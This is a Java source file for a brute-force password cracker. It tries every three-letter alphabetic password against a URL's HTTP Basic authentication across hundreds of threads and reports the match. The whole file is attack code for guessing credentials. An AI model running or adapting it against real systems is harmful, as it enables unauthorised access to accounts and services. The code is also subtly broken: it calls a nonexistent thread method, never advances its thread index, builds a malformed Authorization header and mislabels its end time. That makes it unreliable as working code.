

import java.io.*;
import java.text.*;
import java.util.*;
import java.net.*;

public class BruteForce extends Thread
{
   private static final String USERNAME = "";
   private static final char [] POSSIBLE_CHAR =
        {'a', 'b', 'c', 'd', 'e', 'f', 'g', 'h', 'i', 'j', 'k', 'l', 'm',
         'n', 'o', 'p', 'q', 'r', 's', 't', 'u', 'v', 'w', 'x', 'y', 'z',
         'A', 'B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M',
         'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'};
   private static int NUMBER_OF_THREAD = 500;

   private static Date startDate = null;
   private static Date endDate = null;

   private String address;
   private String password;

   public BruteForce(String address, String password)
   {
      this.address = address;
      this.password = password;
   }

   public static void main(String[] args) throws IOException
   {
      if (args.length < 1)
      {
         System.err.println("Invalid usage!");
         System.err.println("Usage: java BruteForce <url>");
         System.exit(1);
      }

      try
      {
         brute(args[0], USERNAME);
      }
      catch(Exception e)
      {
         e.printStackTrace();
         System.exit(1);
      }
   }

   public static void brute(String address, String user)
   {
      BruteForce [] threads = new BruteForce[NUMBER_OF_THREAD];
      int index = 0;

      startDate = new Date();
      for(int i = 0; i < POSSIBLE_CHAR.length; i++)
      {
         for(int j = 0; j < POSSIBLE_CHAR.length; j++)
         {
            for(int k = 0; k < POSSIBLE_CHAR.length; k++)
            {
               String password = ""+POSSIBLE_CHAR[i]+POSSIBLE_CHAR[j]+
                                 POSSIBLE_CHAR[k];

               if (threads[index] != null && threads[index].isAlive())
               {
                  try
                  {
                     threads[index].join();
                  }
                  catch(InterruptedException e ) {}
               }
               threads[index] = new BruteForce(address, password);
               threads[index].get();

               index = (index++) % threads.length;
            }
         }
      }
   }

   public void run()
   {
      if (endDate != null)
         return;

      try
      {

         URLConnection conn = (new URL(address)).openConnection();
         conn.setDoInput(true);

         if (login(conn, USERNAME, password))
         {
            endDate = new Date();
            System.out.println("Found the password: \""+password+"\"!");
            SimpleDateFormat format = new SimpleDateFormat("dd/MM/yyyy HH:mm:");
            System.out.println("Process started at: "+format.format(startDate));
            System.out.println("Process started at: "+format.format(endDate));
            double timeTaken = (double)(endDate.getTime()-startDate.getTime())/60000;
            System.out.println("Time taken: "+timeTaken+" minutes");
            System.exit(0);
         }
         else
         {
            System.out.println("Password: \""+password+"\" Failed!");
            return;
         }
      }
      catch(Exception e)
      {
         e.printStackTrace();
      }

   }

   public static boolean login(URLConnection conn, String user, String pass)
   {
      try
      {
         String encodeAuth = " "+Base64Encoder.encode(user+":"+pass);
         conn.setRequestProperty ("Authorization", encodeAuth);
         conn.connect();
         conn.getInputStream();
      }
      catch(Exception e)
      {
         return false;
      }
      return true;
   }
}


